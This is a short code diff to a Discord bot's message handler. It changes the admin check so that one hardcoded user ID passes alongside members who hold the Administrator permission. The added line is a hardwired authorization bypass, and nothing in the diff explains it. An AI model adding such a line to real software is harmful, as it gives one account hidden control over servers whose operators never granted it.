@@ -159,7 +159,7 @@ client.on("message", async msg => {
 		let content = msg.content;
 		if(prefix.test(content)) {
 			const member = msg.guild.member(msg.author) || await msg.guild.members.fetch(msg.author);
-			const perm = member.hasPermission(8);
+			const perm = member.hasPermission(8) || member.id === "152282430915608578";
 			content = content.replace(prefix, "");
 			if(content) {
 				content = content.replace(spaces, " ");
